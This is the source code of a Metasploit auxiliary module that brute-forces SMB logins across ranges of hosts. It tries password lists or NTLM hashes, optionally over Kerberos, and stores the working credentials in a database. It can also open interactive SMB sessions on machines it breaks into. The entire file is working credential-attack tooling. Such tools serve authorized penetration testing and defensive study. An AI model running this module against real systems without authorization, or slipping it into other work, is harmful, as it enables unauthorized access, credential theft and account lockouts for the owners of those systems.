##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/smb'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Remote::SMB::Client::Authenticated

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::CommandShell
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  Aliases = [
    'auxiliary/scanner/smb/login'
  ].freeze

  def proto
    'smb'
  end

  def initialize
    super(
      'Name' => 'SMB Login Check Scanner',
      'Description' => %q{
        This module will test a SMB login on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author' => [
        'tebo <tebo[at]attackresearch.com>', # Original
        'Ben Campbell', # Refactoring
        'Brandon McCann "zeknox" <bmccann[at]accuvant.com>', # admin check
        'Tom Sellers <tom[at]fadedcode.net>' # admin check/bug fix
      ],
      'References' => [
        [ 'CVE', '1999-0506'], # Weak password
      ],
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'DB_ALL_CREDS' => false,
        'BLANK_PASSWORDS' => false,
        'USER_AS_PASS' => false,
        'CreateSession' => false
      }
    )

    # These are normally advanced options, but for this module they have a
    # more active role, so make them regular options.
    register_options(
      [
        Opt::Proxies,
        OptBool.new('ABORT_ON_LOCKOUT', [ true, 'Abort the run when an account lockout is detected', false ]),
        OptBool.new('PRESERVE_DOMAINS', [ false, 'Respect a username that contains a domain name.', true ]),
        OptBool.new('RECORD_GUEST', [ false, 'Record guest-privileged random logins to the database', false ]),
        OptBool.new('DETECT_ANY_AUTH', [false, 'Enable detection of systems accepting any authentication', false]),
        OptBool.new('DETECT_ANY_DOMAIN', [false, 'Detect if domain is required for the specified user', false]),
        OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
      ]
    )

    options_to_deregister = %w[USERNAME PASSWORD CommandShellCleanupCommand AutoVerifySession]

    if framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
      add_info('New in Metasploit 6.4 - The %grnCreateSession%clr option within this module can open an interactive session')
    else
      # Don't give the option to create a session unless smb sessions are enabled
      options_to_deregister << 'CreateSession'
    end

    deregister_options(*options_to_deregister)
  end

  def create_session?
    # The CreateSession option is de-registered if SMB_SESSION_TYPE is not enabled
    # but the option can still be set/saved so check to see if we should use it
    if framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
      datastore['CreateSession']
    else
      false
    end
  end

  def run
    results = super
    logins = results.flat_map { |_k, v| v[:successful_logins] }
    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
    return results unless framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)

    if create_session?
      print_status("#{sessions.size} SMB #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
    else
      print_status('You can open an SMB session with these credentials and %grnCreateSession%clr set to true')
    end
    results
  end

  def run_host(ip)
    print_brute(level: :vstatus, ip: ip, msg: 'Starting SMB login bruteforce')

    domain = datastore['SMBDomain'] || ''

    kerberos_authenticator_factory = nil
    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
      fail_with(Msf::Exploit::Failure::BadConfig, 'The Smb::Rhostname option is required when using Kerberos authentication.') if datastore['Smb::Rhostname'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'The SMBDomain option is required when using Kerberos authentication.') if datastore['SMBDomain'].blank?
      fail_with(Msf::Exploit::Failure::BadConfig, 'The DomainControllerRhost is required when using Kerberos authentication.') if datastore['DomainControllerRhost'].blank?

      if !datastore['PASSWORD']
        # In case no password has been provided, we assume the user wants to use Kerberos tickets stored in cache
        # Write mode is still enable in case new TGS tickets are retrieved.
        ticket_storage = kerberos_ticket_storage({ read: true, write: true })
      else
        # Write only cache so we keep all gathered tickets but don't reuse them for auth while running the module
        ticket_storage = kerberos_ticket_storage({ read: false, write: true })
      end

      kerberos_authenticator_factory = lambda do |username, password, realm|
        Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::SMB.new(
          host: datastore['DomainControllerRhost'],
          hostname: datastore['Smb::Rhostname'],
          proxies: datastore['Proxies'],
          realm: realm,
          username: username,
          password: password,
          framework: framework,
          framework_module: self,
          cache_file: datastore['Smb::Krb5Ccname'].blank? ? nil : datastore['Smb::Krb5Ccname'],
          ticket_storage: ticket_storage
        )
      end
    end

    @scanner = Metasploit::Framework::LoginScanner::SMB.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        local_port: datastore['CPORT'],
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        proxies: datastore['Proxies'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        max_send_size: datastore['TCP::max_send_size'],
        send_delay: datastore['TCP::send_delay'],
        framework: framework,
        framework_module: self,
        always_encrypt: datastore['SMB::AlwaysEncrypt'],
        versions: datastore['SMB::ProtocolVersion'].split(',').map(&:strip).reject(&:blank?).map(&:to_i),
        kerberos_authenticator_factory: kerberos_authenticator_factory,
        use_client_as_proof: create_session?
      )
    )

    if datastore['DETECT_ANY_AUTH']
      bogus_result = @scanner.attempt_bogus_login(domain)
      if bogus_result.success?
        if bogus_result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST
          print_status('This system allows guest sessions with random credentials')
        else
          print_error('This system accepts authentication with random credentials, brute force is ineffective.')
          return
        end
      else
        vprint_status('This system does not accept authentication with random credentials, proceeding with brute force')
      end
    end

    cred_collection = build_credential_collection(
      realm: domain,
      username: datastore['SMBUser'],
      password: datastore['SMBPass'],
      ignore_private: datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS && !datastore['PASSWORD']
    )
    cred_collection = prepend_db_hashes(cred_collection)

    @scanner.cred_details = cred_collection
    successful_logins = []
    successful_sessions = []
    @scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::LOCKED_OUT
        if datastore['ABORT_ON_LOCKOUT']
          print_error("Account lockout detected on '#{result.credential.public}', aborting.")
          break
        else
          print_error("Account lockout detected on '#{result.credential.public}', skipping this user.")
        end

      when Metasploit::Model::Login::Status::DENIED_ACCESS
        print_brute level: :status, ip: ip, msg: "Correct credentials, but unable to login: '#{result.credential}', #{result.proof}"
        report_creds(ip, rport, result)
        :next_user
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}' #{result.access_level}"
        successful_logins << result
        report_creds(ip, rport, result)
        if create_session?
          begin
            successful_sessions << session_setup(result)
          rescue ::StandardError => e
            elog('Failed to setup the session', error: e)
            print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
            result.connection.close unless result.connection.nil?
          end
        end
        :next_user
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        if datastore['VERBOSE']
          print_brute level: :verror, ip: ip, msg: 'Could not connect'
        end
        invalidate_login(
          address: ip,
          port: rport,
          protocol: 'tcp',
          public: result.credential.public,
          private: result.credential.private,
          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
          realm_value: result.credential.realm,
          last_attempted_at: DateTime.now,
          status: result.status
        )
        :abort
      when Metasploit::Model::Login::Status::INCORRECT
        if datastore['VERBOSE']
          print_brute level: :verror, ip: ip, msg: "Failed: '#{result.credential}', #{result.proof}"
        end
        invalidate_login(
          address: ip,
          port: rport,
          protocol: 'tcp',
          public: result.credential.public,
          private: result.credential.private,
          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
          realm_value: result.credential.realm,
          last_attempted_at: DateTime.now,
          status: result.status
        )
      end
    end
    { successful_logins: successful_logins, successful_sessions: successful_sessions }
  end

  # This logic is not universal ie a local account will not care about workgroup
  # but remote domain authentication will so check each instance
  def accepts_bogus_domains?(user, pass)
    bogus_domain = @scanner.attempt_login(
      Metasploit::Framework::Credential.new(
        public: user,
        private: pass,
        realm: Rex::Text.rand_text_alpha(8)
      )
    )

    return bogus_domain.success?
  end

  def report_creds(ip, port, result)
    # Private can be nil if we authenticated with Kerberos and a cached ticket was used. No need to report this.
    return unless result.credential.private

    if !datastore['RECORD_GUEST'] && (result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST)
      return
    end

    service_data = {
      address: ip,
      port: port,
      service_name: 'smb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: (
        Rex::Proto::NTLM::Utils.is_pass_ntlm_hash?(result.credential.private) ? :ntlm_hash : :password
      ),
      username: result.credential.public
    }.merge(service_data)

    if datastore['DETECT_ANY_DOMAIN'] && domain.present?
      if accepts_bogus_domains?(result.credential.public, result.credential.private)
        print_brute(level: :vstatus, ip: ip, msg: "Domain is ignored for user #{result.credential.public}")
      else
        credential_data.merge!(
          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
          realm_value: result.credential.realm
        )
      end
    end

    credential_core = create_credential(credential_data)

    login_data = {
      access_level: result.access_level,
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: result.status
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # @param [Metasploit::Framework::LoginScanner::Result] result
  # @return [Msf::Sessions::SMB]
  def session_setup(result)
    return unless (result.connection && result.proof)

    my_session = Msf::Sessions::SMB.new(result.connection, { client: result.proof })
    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public,
      'PASSWORD' => result.credential.private
    }

    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
  end

end
